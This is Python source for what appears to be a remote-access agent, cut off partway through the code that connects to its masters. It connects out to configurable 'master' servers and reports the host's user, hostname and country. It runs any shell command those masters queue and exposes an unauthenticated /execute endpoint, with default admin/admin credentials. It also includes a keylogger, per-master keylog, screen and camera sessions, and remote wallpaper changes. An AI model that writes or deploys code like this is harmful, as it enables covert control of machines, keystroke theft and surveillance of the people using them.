from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from pydantic import BaseModel
import asyncio, os, sys, subprocess, logging, socket
from dotenv import load_dotenv
import secrets, time
import json
import websockets
import urllib.request
from fastapi import Request, UploadFile, File
from typing import Any, Tuple
import base64, io
import shlex
import shutil
import ssl, hashlib
from urllib.parse import urlparse

# Ensure Windows supports asyncio subprocesses
if sys.platform == 'win32':
    try:
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    except Exception:
        pass

logging.basicConfig(level=logging.INFO, format='%(levelname)s:     %(message)s')

load_dotenv()
FRONTEND_URL = os.getenv('FRONTEND_URL', 'http://localhost:5173')
ALLOWED_ORIGINS = [FRONTEND_URL]
# Master control URLs (from env)
MASTER_CONTROL_WS_URL = (os.getenv('MASTER_CONTROL_WS_URL', '') or '').strip()
MASTER_CONTROL_WS_URLS_ENV = (os.getenv('MASTER_CONTROL_WS_URLS', '') or '').strip()
DEFAULT_MASTER_URLS = [u.strip() for u in MASTER_CONTROL_WS_URLS_ENV.split(',') if u.strip()]
if not DEFAULT_MASTER_URLS and MASTER_CONTROL_WS_URL:
    DEFAULT_MASTER_URLS = [MASTER_CONTROL_WS_URL]
# Dynamic masters management (persisted)
MASTERS_FILE = os.getenv('MASTERS_FILE', os.path.join(os.getcwd(), 'masters.json'))
master_urls: list[str] = []
master_tasks: dict[str, asyncio.Task] = {}
master_stop: dict[str, bool] = {}
master_status: dict[str, bool] = {}
AGENT_HTTP_BASE = os.getenv('AGENT_HTTP_BASE', 'http://127.0.0.1:8000')
SESSION_DIRS: dict[str, str] = {}
# Kill long-running commands to avoid stuck queue (seconds)
COMMAND_TIMEOUT_SECONDS = int(os.getenv('COMMAND_TIMEOUT_SECONDS', '30'))
# Remote view/control settings
SCREEN_MAX_FPS = int(os.getenv('SCREEN_MAX_FPS', '10'))
SCREEN_DEFAULT_QUALITY = int(os.getenv('SCREEN_QUALITY', '60'))  # JPEG 1-95
REMOTE_CONTROL_ENABLED = os.getenv('REMOTE_CONTROL_ENABLED', '1').lower() in ('1','true','yes','on')
SCREEN_AUTO_START = os.getenv('SCREEN_AUTO_START', '0').lower() in ('1','true','yes','on')
CAMERA_ENABLED = os.getenv('CAMERA_ENABLED', '1').lower() in ('1','true','yes','on')
# TLS pinning (optional)
MASTER_CERT_SHA256 = (os.getenv('MASTER_CERT_SHA256', '') or '').strip().lower().replace(':','')
MASTER_CA_PEM = os.getenv('MASTER_CA_PEM', '')
MASTER_CA_PEM_PATH = os.getenv('MASTER_CA_PEM_PATH', '')

app = FastAPI()
app.add_middleware(
    CORSMiddleware,
    allow_origins=ALLOWED_ORIGINS,
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

ADMIN_USERNAME = os.getenv('ADMIN_USERNAME', 'admin')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'admin')
TOKEN_TTL_SECONDS = int(os.getenv('TOKEN_TTL_SECONDS', '86400'))
TOKENS: dict[str, float] = {}

class CommandRequest(BaseModel):
    command: str

class LoginRequest(BaseModel):
    username: str
    password: str

@app.post("/login")
async def login(req: LoginRequest):
    try:
        if req.username == ADMIN_USERNAME and req.password == ADMIN_PASSWORD:
            token = secrets.token_urlsafe(32)
            TOKENS[token] = time.time() + TOKEN_TTL_SECONDS
            return {"token": token}
        return JSONResponse({"error": "Invalid credentials"}, status_code=401)
    except Exception as e:
        logging.exception("Login failed")
        return JSONResponse({"error": f"Login failed: {e}"}, status_code=500)

@app.post("/execute")
async def execute(cmd: CommandRequest):
    command = cmd.command
    def run_cmd():
        if os.name == 'nt':
            return subprocess.run(['cmd.exe', '/c', command], capture_output=True, text=True)
        return subprocess.run(command, shell=True, capture_output=True, text=True)
    try:
        logging.info(f"REST execute: {command}")
        proc = await asyncio.to_thread(run_cmd)
        if proc.stdout:
            logging.info(proc.stdout.strip())
        if proc.stderr:
            logging.error(proc.stderr.strip())
        return {"command": command, "stdout": proc.stdout or "", "stderr": proc.stderr or "", "exit_code": proc.returncode}
    except Exception as e:
        logging.error(f"Failed to execute: {e}")
        return JSONResponse({"error": f"Failed to execute: {e}"}, status_code=500)

@app.post("/upload")
async def upload_file(request: Request, file: UploadFile = File(...)):
    token = request.query_params.get("token")
    dir_path = SESSION_DIRS.get(token or "", os.getcwd())
    try:
        name = os.path.basename(file.filename or "upload.bin")
        data = await file.read()
        out_path = os.path.join(dir_path, name)
        with open(out_path, "wb") as f:
            f.write(data)
        return {"saved": out_path, "size": len(data)}
    except Exception as e:
        return JSONResponse({"error": f"Upload failed: {e}"}, status_code=500)

@app.get("/stats")
async def stats(request: Request):
    token = request.query_params.get("token")
    dir_path = SESSION_DIRS.get(token or "", os.getcwd())
    try:
        items = []
        for name in os.listdir(dir_path):
            full = os.path.join(dir_path, name)
            try:
                st = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": int(st.st_size),
                    "modified": int(st.st_mtime),
                })
            except Exception:
                items.append({"name": name, "is_dir": os.path.isdir(full)})
        return {"current_dir": dir_path, "files": items}
    except Exception as e:
        return JSONResponse({"error": f"Stats failed: {e}"}, status_code=500)

@app.post("/upload_master")
async def upload_file_master(file: UploadFile = File(...)):
    try:
        name = os.path.basename(file.filename or "upload.bin")
        data = await file.read()
        out_path = os.path.join(current_agent_dir, name)
        with open(out_path, "wb") as f:
            f.write(data)
        return {"saved": out_path, "size": len(data)}
    except Exception as e:
        return JSONResponse({"error": f"Upload failed: {e}"}, status_code=500)

@app.get("/stats_master")
async def stats_master():
    dir_path = current_agent_dir
    try:
        items = []
        for name in os.listdir(dir_path):
            full = os.path.join(dir_path, name)
            try:
                st = os.stat(full)
                items.append({
                    "name": name,
                    "is_dir": os.path.isdir(full),
                    "size": int(st.st_size),
                    "modified": int(st.st_mtime),
                })
            except Exception:
                items.append({"name": name, "is_dir": os.path.isdir(full)})
        return {"current_dir": dir_path, "files": items}
    except Exception as e:
        return JSONResponse({"error": f"Stats failed: {e}"}, status_code=500)

@app.websocket("/ws/terminal")
async def websocket_terminal(websocket: WebSocket):
    # Validate token from query params before accepting
    token = websocket.query_params.get("token") if hasattr(websocket, "query_params") else None
    now = time.time()
    if not token or token not in TOKENS or TOKENS[token] < now:
        await websocket.close(code=1008)
        return
    await websocket.accept()
    current_dir = os.getcwd()
    SESSION_DIRS[token] = current_dir
    try:
        while True:
            msg = await websocket.receive_text()
            logging.info("Frontend : %s", msg)
            # Handle built-in directory changes so cwd persists across commands
            stripped = msg.strip()
            parts0 = stripped.split(maxsplit=1)
            head0 = parts0[0].lower() if parts0 else ""
            arg0 = parts0[1] if len(parts0) > 1 else None
            if head0 in ("cd", "chdir"):
                target = arg0.strip() if arg0 else None
                if target:
                    if target.lower().startswith("/d "):
                        target = target[3:].strip()
                    target = os.path.expandvars(os.path.expanduser(target))
                    target = target.strip().strip('"').strip("'")
                    if len(target) == 2 and target[1] == ":" and target[0].isalpha():
                        new_dir = f"{target}\\"
                    else:
                        new_dir = target if os.path.isabs(target) else os.path.abspath(os.path.join(current_dir, target))
                    if os.path.isdir(new_dir):
                        current_dir = new_dir
                        SESSION_DIRS[token] = current_dir
                        await websocket.send_json({"output": current_dir + "\n"})
                        await websocket.send_json({"exit_code": 0})
                    else:
                        await websocket.send_json({"error": "The system cannot find the path specified.\n"})
                        await websocket.send_json({"exit_code": 1})
                else:
                    await websocket.send_json({"output": current_dir + "\n"})
                    await websocket.send_json({"exit_code": 0})
                continue
            cmd_to_run = msg

            # Block interactive shells without arguments (e.g., 'netsh')
            try:
                forbid, headx = _is_interactive_disallowed(cmd_to_run)
            except Exception:
                forbid, headx = (False, "")
            if forbid:
                await websocket.send_json({"error": f"Interactive command '{headx}' requires arguments; interactive sessions are not supported.\n"})
                await websocket.send_json({"exit_code": 1})
                continue

            # Execute and stream command output
            if os.name == "nt":
                # Windows fallback: use threads with subprocess.Popen to avoid NotImplementedError
                def start_proc():
                    return subprocess.Popen(
                        ["cmd.exe", "/c", cmd_to_run],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True,
                        encoding="utf-8",
                        errors="replace",
                        bufsize=1,
                        cwd=current_dir,
                    )
                proc = await asyncio.to_thread(start_proc)
                loop = asyncio.get_running_loop()
                queue: asyncio.Queue[tuple[str, str]] = asyncio.Queue()
                def reader(stream, key):
                    try:
                        for line in stream:
                            loop.call_soon_threadsafe(queue.put_nowait, (key, line))
                    except Exception as e:
                        loop.call_soon_threadsafe(queue.put_nowait, ("error", f"[reader {key} failed: {e}\n]"))
                    finally:
                        loop.call_soon_threadsafe(queue.put_nowait, ("__done__", key))
                t1 = asyncio.create_task(asyncio.to_thread(reader, proc.stdout, "output"))
                t2 = asyncio.create_task(asyncio.to_thread(reader, proc.stderr, "error"))
                done_readers = 0
                while done_readers < 2:
                    key, payload = await queue.get()
                    if key == "__done__":
                        done_readers += 1
                        continue
                    await websocket.send_json({key: payload})
                await asyncio.gather(t1, t2)
                try:
                    return_code = await asyncio.wait_for(asyncio.to_thread(proc.wait), timeout=COMMAND_TIMEOUT_SECONDS)
                except asyncio.TimeoutError:
                    try:
                        proc.terminate()
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)
                    try:
                        if proc.poll() is None:
                            proc.kill()
                    except Exception:
                        pass
                    await websocket.send_json({"error": f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n"})
                    return_code = 124
                await websocket.send_json({"exit_code": return_code})
            else:
                proc = await asyncio.create_subprocess_shell(
                    cmd_to_run,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=current_dir,
                )
                async def stream_reader(stream, key):
                    try:
                        while True:
                            line = await stream.readline()
                            if not line:
                                break
                            text = line.decode(errors="replace")
                            await websocket.send_json({key: text})
                    except Exception:
                        logging.exception("Streaming failed")
                await asyncio.gather(
                    stream_reader(proc.stdout, "output"),
                    stream_reader(proc.stderr, "error"),
                )
                try:
                    return_code = await asyncio.wait_for(proc.wait(), timeout=COMMAND_TIMEOUT_SECONDS)
                except asyncio.TimeoutError:
                    try:
                        proc.terminate()
                    except ProcessLookupError:
                        pass
                    except Exception:
                        pass
                    await asyncio.sleep(0.5)
                    try:
                        proc.kill()
                    except Exception:
                        pass
                    await websocket.send_json({"error": f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n"})
                    return_code = 124
                await websocket.send_json({"exit_code": return_code})

    except WebSocketDisconnect:
        logging.info("WebSocket disconnected")
    except Exception:
        logging.exception("WebSocket error")
    finally:
        if token:
            SESSION_DIRS.pop(token, None)


# Optional local keylogger UI (guarded) for testing
if __name__ == "__main__" and os.getenv("ENABLE_KEYLOGGER_UI", "0").lower() in ("1","true","yes","on"):
    try:
        import tkinter as _tk
        from tkinter import CENTER as _CENTER, RIGHT as _RIGHT, LEFT as _LEFT
        from pynput import keyboard as _keyboard
        from typing import Any as _Any
        from datetime import datetime as _dt
        import json as _json
        import os as _os

        _OUT_DIR = _os.path.join(_os.getcwd(), "out")
        _os.makedirs(_OUT_DIR, exist_ok=True)

        keys_used: list[dict[str,str]] = []
        flag: bool = False
        keys: str = ""
        now: _dt = _dt.now()

        def _text_path():
            return _os.path.join(_OUT_DIR, "key_log.txt")

        def _json_path():
            return _os.path.join(_OUT_DIR, "key_log.json")

        def generate_text_log(key: _Any) -> None:
            with open(_text_path(), "w", encoding="utf-8") as f:
                f.write(str(key))

        def generate_json_file(used_keys: _Any) -> None:
            with open(_json_path(), "wb") as f:
                f.write(_json.dumps(used_keys).encode("utf-8"))

        def on_press(key: _Any) -> None:
            global flag, keys_used
            if not flag:
                keys_used.append({"Pressed": f"{key}"})
                flag = True
            else:
                keys_used.append({"Held": f"{key}"})
            generate_json_file(keys_used)

        def on_release(key: _Any) -> None:
            global flag, keys_used, keys
            keys_used.append({"Released": f"{key}"})
            if flag:
                flag = False
            generate_json_file(keys_used)
            keys = keys + str(key)
            generate_text_log(keys)

        listener = _keyboard.Listener(on_press=on_press, on_release=on_release)

        def start_keylogger():
            listener.start()
            label.config(text="[+] Keylogger is running!\n[!] Saving keys in 'out/'")
            start_button.config(state="disabled")
            stop_button.config(state="normal")

        def stop_keylogger():
            try:
                listener.stop()
            except Exception:
                pass
            label.config(text="Keylogger stopped.")
            start_button.config(state="normal")
            stop_button.config(state="disabled")

        root = _tk.Tk()
        root.title("Keylogger")
        label = _tk.Label(root, text='Click "Start" to begin key logging...')
        label.config(anchor=_CENTER)
        label.pack()
        start_button = _tk.Button(root, text="Start", command=start_keylogger)
        start_button.pack(side=_LEFT)
        stop_button = _tk.Button(root, text="Stop", command=stop_keylogger, state="disabled")
        stop_button.pack(side=_RIGHT)
        root.geometry("300x280")
        root.mainloop()
    except Exception as _e:
        print(f"[keylogger-ui] disabled: {_e}")
# Agent-to-Master connector
current_agent_dir = os.getcwd()
# Per-session working directories (keyed by (ws, session_id)) for split terminals
pane_dirs: dict[tuple[Any, str], str] = {}

# Global single-run queue across all masters
queue_lock: asyncio.Lock = asyncio.Lock()
command_queue: list[tuple[Any, str, str | None]] = []  # (ws, command, session_id)
queue_task: asyncio.Task | None = None
command_running: bool = False
# Track current running process (if any) and start time for stale detection
queue_current_proc: Any = None
queue_started_at: float = 0.0

async def _send_line(ws, key, text):
    try:
        await ws.send(json.dumps({key: text}))
    except Exception:
        pass

async def _broadcast_queue_positions():
    # Inform waiting masters of their earliest position in queue
    try:
        async with queue_lock:
            # Compute first index per ws
            pos: dict[Any, int] = {}
            for idx, (w, _c) in enumerate(command_queue):
                if w not in pos:
                    pos[w] = idx + 1  # 1-based
        # Send outside lock
        for w, p in pos.items():
            try:
                await _send_line(w, "output", f"[Queue] You are #{p} in queue\n")
            except Exception:
                pass
    except Exception:
        pass

async def _process_queue():
    global queue_task, command_running, queue_current_proc, queue_started_at
    while True:
        ws = None
        cmd = None
        sid: str | None = None
        async with queue_lock:
            if not command_queue:
                # Nothing to do; reset runner state and exit
                queue_task = None
                command_running = False
                return
            # If a command is in progress, check for stale state; otherwise wait
            if command_running:
                try:
                    if queue_current_proc is None and queue_started_at > 0 and (time.time() - queue_started_at) > 1.5:
                        # Stale state: no running proc but busy flag set; clear it to recover
                        command_running = False
                except Exception:
                    pass
            if not command_running:
                ws, cmd, sid = command_queue.pop(0)
                command_running = True
        if ws is None:
            await asyncio.sleep(0.1)
            continue
        try:
            await _send_line(ws, "output", "[Queue] Your command is starting...\n")
            await _run_agent_command(cmd, ws, sid)
        except Exception:
            logging.exception("Queued command failed")
        finally:
            async with queue_lock:
                command_running = False
            # Update positions for remaining queued requests
            await _broadcast_queue_positions()

async def _ensure_queue_runner():
    global queue_task, command_running
    async with queue_lock:
        if command_queue and (queue_task is None or queue_task.done()):
            # If previous runner crashed, make sure we clear the busy flag
            if queue_task is not None and queue_task.done():
                command_running = False
            queue_task = asyncio.create_task(_process_queue())

async def enqueue_command(ws, cmd: str, session_id: str | None = None):
    # If nothing running and queue empty, run immediately via queue machinery
    async with queue_lock:
        command_queue.append((ws, cmd, session_id))
        # Compute this ws position (first occurrence)
        pos = next((i + 1 for i, (w, _c, _s) in enumerate(command_queue) if w is ws), 1)
    if pos > 1 or command_running:
        await _send_line(ws, "output", f"[Queued] You are #{pos} in queue. Waiting for your turn...\n")
    await _ensure_queue_runner()

async def _remove_queued_for_ws(ws):
    try:
        async with queue_lock:
            # Remove all pending items for this ws
            i = 0
            while i < len(command_queue):
                if command_queue[i][0] is ws:
                    command_queue.pop(i)
                else:
                    i += 1
    except Exception:
        pass

def _is_interactive_disallowed(cmd: str) -> Tuple[bool, str]:
    try:
        stripped = cmd.strip()
        parts0 = stripped.split(maxsplit=1)
        head0 = parts0[0].lower() if parts0 else ""
        arg0 = parts0[1] if len(parts0) > 1 else None
        if os.name == "nt":
            block = {"netsh", "powershell", "cmd"}
        else:
            block = {"bash", "sh", "zsh"}
        if head0 in block and not arg0:
            return True, head0
        return False, head0
    except Exception:
        return False, ""

async def _run_agent_command(cmd: str, ws, session_id: str | None = None):
    global current_agent_dir, queue_current_proc, queue_started_at, pane_dirs
    stripped = cmd.strip()
    parts0 = stripped.split(maxsplit=1)
    head0 = parts0[0].lower() if parts0 else ""
    arg0 = parts0[1] if len(parts0) > 1 else None
    if head0 in ("cd","chdir"):
        base_dir = current_agent_dir
        if session_id:
            base_dir = pane_dirs.get((ws, session_id), current_agent_dir)
        target = arg0.strip() if arg0 else None
        if target:
            if target.lower().startswith("/d "):
                target = target[3:].strip()
            target = os.path.expandvars(os.path.expanduser(target))
            target = target.strip().strip('"').strip("'")
            if len(target)==2 and target[1]==":" and target[0].isalpha():
                new_dir = f"{target}\\"
            else:
                new_dir = target if os.path.isabs(target) else os.path.abspath(os.path.join(base_dir, target))
            if os.path.isdir(new_dir):
                if session_id:
                    pane_dirs[(ws, session_id)] = new_dir
                else:
                    current_agent_dir = new_dir
                await _send_line(ws, "output", new_dir + "\n")
                await _send_line(ws, "exit_code", 0)
            else:
                await _send_line(ws, "error", "The system cannot find the path specified.\n")
                await _send_line(ws, "exit_code", 1)
        else:
            await _send_line(ws, "output", base_dir + "\n")
            await _send_line(ws, "exit_code", 0)
        return

    # Block interactive shells without arguments (e.g., 'netsh')
    try:
        forbid, headx = _is_interactive_disallowed(cmd)
    except Exception:
        forbid, headx = (False, "")
    if forbid:
        await _send_line(ws, "error", f"Interactive command '{headx}' requires arguments; interactive sessions are not supported.\n")
        await _send_line(ws, "exit_code", 1)
        return

    # Choose working directory per session (or global)
    try:
        work_dir = pane_dirs.get((ws, session_id), current_agent_dir) if session_id else current_agent_dir
    except Exception:
        work_dir = current_agent_dir
    if os.name == "nt":
        def start_proc():
            return subprocess.Popen(
                ["cmd.exe","/c", cmd],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                encoding="utf-8",
                errors="replace",
                bufsize=1,
                cwd=work_dir,
            )
        # mark running proc for queue tracking
        queue_started_at = time.time()
        proc = await asyncio.to_thread(start_proc)
        queue_current_proc = proc
        loop = asyncio.get_running_loop()
        queue: asyncio.Queue[tuple[str,str]] = asyncio.Queue()
        def reader(stream, key):
            try:
                for line in stream:
                    loop.call_soon_threadsafe(queue.put_nowait, (key, line))
            except Exception as e:
                loop.call_soon_threadsafe(queue.put_nowait, ("error", f"[reader {key} failed: {e}\n]"))
            finally:
                loop.call_soon_threadsafe(queue.put_nowait, ("__done__", key))
        t1 = asyncio.create_task(asyncio.to_thread(reader, proc.stdout, "output"))
        t2 = asyncio.create_task(asyncio.to_thread(reader, proc.stderr, "error"))
        done_readers = 0
        while done_readers < 2:
            key, payload = await queue.get()
            if key == "__done__":
                done_readers += 1
                continue
            await _send_line(ws, key, payload)
        await asyncio.gather(t1, t2)
        try:
            code = await asyncio.wait_for(asyncio.to_thread(proc.wait), timeout=COMMAND_TIMEOUT_SECONDS)
        except asyncio.TimeoutError:
            try:
                proc.terminate()
            except Exception:
                pass
            await asyncio.sleep(0.5)
            try:
                if proc.poll() is None:
                    proc.kill()
            except Exception:
                pass
            await _send_line(ws, "error", f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n")
            code = 124
        await _send_line(ws, "exit_code", code)
        # clear tracker
        try:
            queue_current_proc = None
        except Exception:
            pass
    else:
        # posix
        queue_started_at = time.time()
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=work_dir,
        )
        queue_current_proc = proc
        async def stream_reader(stream, key):
            try:
                while True:
                    line = await stream.readline()
                    if not line:
                        break
                    text = line.decode(errors="replace")
                    await _send_line(ws, key, text)
            except Exception:
                logging.exception("Agent streaming failed")
        await asyncio.gather(
            stream_reader(proc.stdout, "output"),
            stream_reader(proc.stderr, "error"),
        )
        try:
            code = await asyncio.wait_for(proc.wait(), timeout=COMMAND_TIMEOUT_SECONDS)
        except asyncio.TimeoutError:
            try:
                proc.terminate()
            except ProcessLookupError:
                pass
            except Exception:
                pass
            await asyncio.sleep(0.5)
            try:
                proc.kill()
            except Exception:
                pass
            await _send_line(ws, "error", f"[Timeout] Command exceeded {COMMAND_TIMEOUT_SECONDS}s and was terminated.\n")
            code = 124
        await _send_line(ws, "exit_code", code)
        # clear tracker
        try:
            queue_current_proc = None
        except Exception:
            pass

def _derive_identity_sync() -> tuple[str, str]:
    # Returns (agent_id, agent_name) derived from local system
    try:
        if os.name == 'nt':
            proc = subprocess.run(["cmd.exe", "/c", "whoami"], capture_output=True, text=True)
        else:
            proc = subprocess.run(["whoami"], capture_output=True, text=True)
        who = (proc.stdout or "").strip() or os.getenv("USERNAME") or os.getenv("USER") or "unknown"
    except Exception:
        who = os.getenv("USERNAME") or os.getenv("USER") or "unknown"
    host = os.getenv('COMPUTERNAME') or socket.gethostname() or 'host'
    base = f"agent-{host}-{who}".lower()
    safe = ''.join(ch if ch.isalnum() or ch in ('-', '_', '.') else '-' for ch in base)
    agent_id = safe.strip('-') or 'agent-unknown'
    agent_name = who
    return agent_id, agent_name

def _derive_geo_sync() -> tuple[str | None, str | None]:
    try:
        with urllib.request.urlopen('https://ipwho.is/') as resp:
            raw = resp.read().decode('utf-8', errors='replace')
        data = json.loads(raw)
        if data.get('success') is False:
            return None, None
        return data.get('country'), data.get('country_code')
    except Exception:
        return None, None

# --- Masters helpers ---
def _build_ssl_context_for_url(url: str) -> ssl.SSLContext | None:
    try:
        scheme = urlparse(url).scheme.lower()
    except Exception:
        scheme = ''
    if scheme != 'wss':
        return None
    ctx = ssl.create_default_context()
    # If a custom CA/pinned cert is provided, use it for verification.
    try:
        if isinstance(MASTER_CA_PEM, str) and MASTER_CA_PEM.strip():
            ctx.load_verify_locations(cadata=MASTER_CA_PEM)
        elif isinstance(MASTER_CA_PEM_PATH, str) and MASTER_CA_PEM_PATH.strip() and os.path.isfile(MASTER_CA_PEM_PATH):
            ctx.load_verify_locations(MASTER_CA_PEM_PATH)
    except Exception:
        pass
    return ctx

async def _verify_ws_peer_fingerprint(ws, expected_hex: str) -> bool:
    try:
        if not expected_hex:
            return True
        sslobj = ws.transport.get_extra_info('ssl_object') if hasattr(ws, 'transport') else None
        if not sslobj:
            return False
        der = sslobj.getpeercert(True)
        fp = hashlib.sha256(der).hexdigest()
        return fp.lower() == expected_hex.lower()
    except Exception:
        return False

def _load_masters_sync() -> list[str]:
    try:
        if os.path.isfile(MASTERS_FILE):
            raw = open(MASTERS_FILE, 'r', encoding='utf-8').read()
            data = json.loads(raw)
            if isinstance(data, list):
                return [str(u) for u in data if isinstance(u, str) and u.strip()]
    except Exception:
        pass
# Fallback to defaults
    return [u for u in DEFAULT_MASTER_URLS if isinstance(u, str) and u.strip()]

def _save_masters_sync(urls: list[str]) -> None:
    try:
        with open(MASTERS_FILE, 'w', encoding='utf-8') as f:
            f.write(json.dumps(urls, indent=2))
    except Exception:
        pass

# --- Wallpaper helpers ---
def _save_image_from_payload_sync(payload: dict, base_dir: str) -> tuple[bool, str, str]:
    """
    Save an image from one of payload keys: 'path' (absolute or relative), 'url',
    'data_url' (data:image/...;base64,....) or 'b64'. Returns (ok, path, error).
    Relative paths are resolved under base_dir.
    """
    try:
        # Existing local path
        p = payload.get('path')
        if isinstance(p, str) and p.strip():
            p = p.strip().strip('"').strip("'")
            full = p if os.path.isabs(p) else os.path.abspath(os.path.join(base_dir, p))
            if os.path.isfile(full):
                return True, full, ''
            return False, '', f"Path not found: {full}"
        # URL download
        u = payload.get('url')
        if isinstance(u, str) and u.strip():
            u = u.strip()
            try:
                fname = f"wallpaper_{int(time.time())}.jpg"
                out = os.path.abspath(os.path.join(base_dir, fname))
                with urllib.request.urlopen(u, timeout=15) as resp:
                    data = resp.read()
                with open(out, 'wb') as f:
                    f.write(data)
                return True, out, ''
            except Exception as e:
                return False, '', f"Download failed: {e}"
        # Data URL / raw base64
        durl = payload.get('data_url') or payload.get('data') or payload.get('b64')
        if isinstance(durl, str) and durl.strip():
            s = durl.strip()
            try:
                if s.startswith('data:') and ';base64,' in s:
                    s = s.split(';base64,', 1)[1]
                raw = base64.b64decode(s, validate=False)
                fname = f"wallpaper_{int(time.time())}.jpg"
                out = os.path.abspath(os.path.join(base_dir, fname))
                with open(out, 'wb') as f:
                    f.write(raw)
                return True, out, ''
            except Exception as e:
                return False, '', f"Decode failed: {e}"
        return False, '', 'No image payload provided'
    except Exception as e:
        return False, '', str(e)

def _set_wallpaper_local_sync(image_path: str, style: str | None = None) -> tuple[bool, str]:
    """
    Set desktop wallpaper cross-platform (best-effort). Returns (ok, message).
    style: 'fill'|'fit'|'stretch'|'tile'|'center'|'span' (Windows only)
    """
    try:
        if os.name == 'nt':
            try:
                import ctypes, winreg  # type: ignore
            except Exception:
                import ctypes  # type: ignore
                winreg = None  # type: ignore
            # Apply style via registry if available
            if winreg is not None and isinstance(style, str):
                sty = style.lower().strip()
                wp_style = {
                    'fill': ('10','0'),
                    'fit': ('6','0'),
                    'stretch': ('2','0'),
                    'tile': ('0','1'),
                    'center': ('0','0'),
                    'span': ('22','0'),
                }.get(sty)
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
                    if wp_style:
                        winreg.SetValueEx(key, 'WallpaperStyle', 0, winreg.REG_SZ, wp_style[0])
                        winreg.SetValueEx(key, 'TileWallpaper', 0, winreg.REG_SZ, wp_style[1])
                    try:
                        winreg.SetValueEx(key, 'Wallpaper', 0, winreg.REG_SZ, image_path)
                    except Exception:
                        pass
                    winreg.CloseKey(key)
                except Exception:
                    pass
            SPI_SETDESKWALLPAPER = 20
            SPIF_UPDATEINIFILE = 0x01
            SPIF_SENDWININICHANGE = 0x02
            ok = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
            return (ok == 1), ("Wallpaper set" if ok == 1 else "Failed to set wallpaper")
        # macOS
        if sys.platform == 'darwin':
            try:
                script = f'''osascript -e 'tell application "System Events" to set picture of every desktop to (POSIX file "{image_path}")' '''
                r = subprocess.run(script, shell=True)
                return (r.returncode == 0), ("Wallpaper set" if r.returncode == 0 else "Failed to set wallpaper")
            except Exception as e:
                return False, f"Failed: {e}"
        # Linux (GNOME best-effort)
        try:
            r = subprocess.run(["gsettings","set","org.gnome.desktop.background","picture-uri", f"file://{image_path}"], capture_output=True)
            ok = (r.returncode == 0)
            if ok:
                return True, "Wallpaper set"
        except Exception:
            pass
        return False, "Unsupported platform or desktop environment"
    except Exception as e:
        return False, str(e)

# Track interactive sessions per master connection
interactive_sessions: dict[Any, dict] = {}

# --- File operation helpers ---
def _fs_copy_move_sync(op: str, items: list[str], src_dir: str, dest_dir: str, overwrite: bool = False) -> tuple[bool, list[str]]:
    try:
        out: list[str] = []
        src_dir_abs = src_dir if os.path.isabs(src_dir) else os.path.abspath(src_dir)
        dest_dir_abs = dest_dir if os.path.isabs(dest_dir) else os.path.abspath(dest_dir)
        if not os.path.isdir(dest_dir_abs):
            os.makedirs(dest_dir_abs, exist_ok=True)
        for name in items:
            if not isinstance(name, str) or not name.strip():
                continue
            src_path = name if os.path.isabs(name) else os.path.abspath(os.path.join(src_dir_abs, name))
            if not os.path.exists(src_path):
                out.append(f"[fs] skip missing: {src_path}")
                continue
            base = os.path.basename(src_path)
            dst_path = os.path.join(dest_dir_abs, base)
            # Resolve collisions if not overwriting
            if os.path.exists(dst_path) and not overwrite:
                stem, ext = os.path.splitext(base)
                k = 1
                while os.path.exists(dst_path):
                    dst_path = os.path.join(dest_dir_abs, f"{stem} ({k}){ext}")
                    k += 1
            try:
                if op == 'copy':
                    if os.path.isdir(src_path):
                        shutil.copytree(src_path, dst_path, dirs_exist_ok=bool(overwrite))
                    else:
                        # Ensure parent exists
                        os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                        shutil.copy2(src_path, dst_path)
                    out.append(f"[copy] {src_path} -> {dst_path}")
                elif op == 'move':
                    os.makedirs(os.path.dirname(dst_path), exist_ok=True)
                    shutil.move(src_path, dst_path)
                    out.append(f"[move] {src_path} -> {dst_path}")
                else:
                    out.append(f"[fs] unknown op: {op}")
            except Exception as e:
                out.append(f"[fs] failed {op} {src_path}: {e}")
        return True, out
    except Exception as e:
        return False, [f"[fs] error: {e}"]
screen_sessions: dict[Any, dict] = {}
camera_sessions: dict[Any, dict] = {}
# Keylogger sessions per master connection
keylog_sessions: dict[Any, Any] = {}

async def _connect_one_master(url: str):
    global command_running, queue_task, queue_current_proc, queue_started_at, command_queue, master_stop, master_urls
    last_log = 0.0
    retry_delay = 2
    while True:
        try:
            # If this URL has been removed, stop task
            if master_stop.get(url) or url not in master_urls:
                break
            ssl_ctx = _build_ssl_context_for_url(url)
            async with websockets.connect(url, ping_interval=20, ping_timeout=20, ssl=ssl_ctx) as ws:
                # Optional TLS certificate pinning (SHA256 of peer cert DER)
                if url.lower().startswith('wss') and MASTER_CERT_SHA256:
                    ok_pin = await _verify_ws_peer_fingerprint(ws, MASTER_CERT_SHA256)
                    if not ok_pin:
                        try:
                            await ws.close()
                        except Exception:
                            pass
                        raise RuntimeError("Pinned certificate mismatch for master")
                try:
                    master_status[url] = True
                except Exception:
                    pass
                try:
                    agent_id, agent_name = await asyncio.to_thread(_derive_identity_sync)
                    country, country_code = await asyncio.to_thread(_derive_geo_sync)
                    await ws.send(json.dumps({
                        "agent_id": agent_id,
                        "agent_name": agent_name,
                        "http_base": AGENT_HTTP_BASE,
                        "has_camera": bool(CAMERA_ENABLED),
